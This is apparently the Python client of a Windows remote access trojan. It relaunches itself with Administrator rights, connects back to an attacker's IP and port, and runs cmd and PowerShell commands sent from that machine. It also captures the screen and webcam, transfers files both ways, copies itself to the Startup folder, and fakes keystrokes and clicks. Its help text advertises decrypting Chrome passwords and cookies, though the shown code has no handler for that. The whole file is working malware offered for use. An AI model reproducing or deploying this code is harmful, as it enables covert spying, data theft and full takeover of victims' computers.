import ctypes# type: ignore
import sys# type: ignore
import socket# type: ignore
import os# type: ignore
import time# type: ignore
import pyautogui  # type: ignore # already imported
import cv2, numpy as np, struct, io# type: ignore
import subprocess# type: ignore
import shutil# type: ignore
import json# type: ignore
import win32crypt# type: ignore
import base64# type: ignore
import sqlite3# type: ignore
from Crypto.Cipher import AES  # type: ignore
from pynput.mouse import Controller, Button# type: ignore


mouse = Controller()

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    print("[!] Restarting script with Administrator privileges...")
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

SERVER_IP = "REPLACE WITH THE IPv4 OF THE COMPUTER YOUR ATTACKING FROM"  # Automatically inserted
SERVER_PORT = 5555
OUTPUT_FILE = "command_output.txt"

def save_output_to_file(output):
    with open(OUTPUT_FILE, "a") as f:
        f.write(output + "\n")
    print(f"Output saved to {OUTPUT_FILE}")

def execute_command(command):
    try:
        return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
    except Exception as e:
        return str(e)

def send_data(sock, data: bytes):
    length = len(data)
    sock.sendall(length.to_bytes(8, byteorder='big'))
    sock.sendall(data)

def recv_all(sock, length):
    data = b""
    while len(data) < length:
        more = sock.recv(length - len(data))
        if not more:
            raise EOFError("Socket closed before receiving all data")
        data += more
    return data

def capture_and_send_screenshot(client):
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png")
    with open("screenshot.png", "rb") as f:
        screenshot_data = f.read()
    send_data(client, screenshot_data)
    return "[+] Screenshot sent to server."

def add_to_startup(file_path):
    startup_folder = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
    os.system(f'copy "{file_path}" "{startup_folder}"')
    return "File added to startup."

def stream_screenshots(sock):
    sock.settimeout(0.1)  # Non-blocking small timeout for recv()
    try:
        while True:
            # Capture screenshot
            img = pyautogui.screenshot()
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            encoded, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
            data = buffer.tobytes()
            size = len(data)
            # Send frame size and frame data
            sock.sendall(struct.pack(">L", size))
            sock.sendall(data)

            # Check if there's a stopstream command sent by the server
            try:
                command = sock.recv(1024).decode().strip()
                if command == "stopstream":
                    break
            except socket.timeout:
                # No data received, continue streaming
                pass
    finally:
        sock.settimeout(None)  # Reset timeout


def remove_from_startup(file_name):
    startup_folder = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
    file_path = os.path.join(startup_folder, file_name)
    if os.path.exists(file_path):
        os.remove(file_path)
        return "File removed from startup."
    return "File not found in startup."

def execute_powershell(command):
    try:
        result = subprocess.check_output(["powershell", "-Command", command], shell=True, stderr=subprocess.STDOUT, text=True)
        return result
    except Exception as e:
        return str(e)

def show_help():
    help_text = """
    Available Commands:
    - screenshot                    : Capture the current screenshot.
    - cmd <command prompt>          : Run a system command and return the output.
    - webcam                        : Capture a webcam image.
    - asf <file_path>               : Add file to startup.
    - rsf <file_name>               : Remove file from startup.
    - movemouse <x> <y>             : Move mouse cursor to screen coordinate (x, y).
    - leftclick                     : Simulate a left mouse click.
    - ps <powershell command>       : Run powershell command
    - download                      : Download files from the clients system.
    - upload                        : Upload files to the clients system.
    - passwords                     : Retrieve and decrypt Chrome passwords.
    - cookies                       : Retrieve and decrypt Chrome cookies.
    - keytype <text>                : Simulate typing the given text.
    - enter                         : Simulate pressing the Enter key.
    - help                          : Show this help message.
    - exit                          : Close the connection.
    """
    return help_text

def capture_and_send_webcam(client):
    try:
        import cv2  # type: ignore
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        if ret:
            cv2.imwrite("webcam_image.png", frame)
            cam.release()
            with open("webcam_image.png", "rb") as f:
                image_data = f.read()
            send_data(client, image_data)
            return "[+] Webcam image sent to server."
        cam.release()
        return "[-] Failed to capture image."
    except Exception as e:
        return f"[-] Webcam capture error: {e}"

def main():
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((SERVER_IP, SERVER_PORT))

            if not is_admin():
                client.send(b"[-] Error: This script must be run as Administrator.")

            while True:
                command = client.recv(1024).decode()

                if command == "screenshot":
                    response = capture_and_send_screenshot(client)
                    save_output_to_file(response)
                    send_data(client, response.encode())

                elif command.startswith("cmd "):
                    output = execute_command(command[4:])
                    save_output_to_file(output)
                    send_data(client, output.encode())

                elif command.startswith("ps "):
                    ps_command = command[3:]
                    output = execute_powershell(ps_command)
                    save_output_to_file(output)
                    send_data(client, output.encode())

                elif command.startswith("download "):
                    file_path = command.split(" ", 1)[1]
                    try:
                        with open(file_path, "rb") as f:
                            file_data = f.read()
                        send_data(client, file_data)
                        response = f"[+] File '{file_path}' sent to server."
                    except Exception as e:
                        response = f"[-] Failed to send file: {e}"
                        send_data(client, response.encode())  # Send error message properly
                    save_output_to_file(response)

                elif command.startswith("upload "):
                    file_path = command.split(" ", 1)[1]
                    try:
                        file_data_len_bytes = recv_all(client, 8)
                        file_size = int.from_bytes(file_data_len_bytes, "big")
                        file_content = recv_all(client, file_size)

                        with open(file_path, "wb") as f:
                            f.write(file_content)

                        response = f"[+] File received and saved to {file_path}"
                    except Exception as e:
                        response = f"[-] Failed to receive file: {e}"

                    save_output_to_file(response)
                    send_data(client, response.encode())

                elif command == "webcam":
                    response = capture_and_send_webcam(client)
                    save_output_to_file(response)
                    send_data(client, response.encode())

                elif command.startswith("asf "):
                    file_path = command.split(" ", 1)[1]
                    response = add_to_startup(file_path)
                    save_output_to_file(response)
                    send_data(client, response.encode())

                elif command.startswith("rsf "):
                    file_name = command.split(" ", 1)[1]
                    response = remove_from_startup(file_name)
                    save_output_to_file(response)
                    send_data(client, response.encode())

                elif command.startswith("keytype "):
                    text = command[8:]
                    from pynput.keyboard import Controller as KeyboardController # type: ignore
                    keyboard = KeyboardController()
                    keyboard.type(text)
                    response = f"[+] Typed text: {text}"
                    save_output_to_file(response)
                    send_data(client, response.encode())

                elif command == "enter":
                    from pynput.keyboard import Controller as KeyboardController # type: ignore
                    keyboard = KeyboardController()
                    keyboard.press('\n')
                    keyboard.release('\n')
                    response = "[+] Enter key pressed."
                    save_output_to_file(response)
                    send_data(client, response.encode())

                elif command.startswith("movemouse "):
                    try:
                        _, x_str, y_str = command.split()
                        x, y = int(x_str), int(y_str)
                        mouse.position = (x, y)
                        response = f"[+] Mouse moved to ({x}, {y})"
                    except Exception as e:
                        response = f"[-] Mouse move error: {e}"
                    save_output_to_file(response)
                    send_data(client, response.encode())

                elif command == "leftclick":
                    try:
                        mouse.click(Button.left, 1)
                        response = "[+] Left click performed."
                    except Exception as e:
                        response = f"[-] Left click error: {e}"
                    save_output_to_file(response)
                    send_data(client, response.encode())

                elif command == "help":
                    response = show_help()
                    save_output_to_file(response)
                    send_data(client, response.encode())

                elif command == "exit":
                    save_output_to_file("[*] Client exiting...")
                    client.close()
                    sys.exit()

                else:
                    response = "[-] Unknown command."
                    save_output_to_file(response)
                    send_data(client, response.encode())

        except (ConnectionResetError, EOFError):
            time.sleep(5)  # reconnect delay

        except Exception as e:
            print(f"[!] Unexpected error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
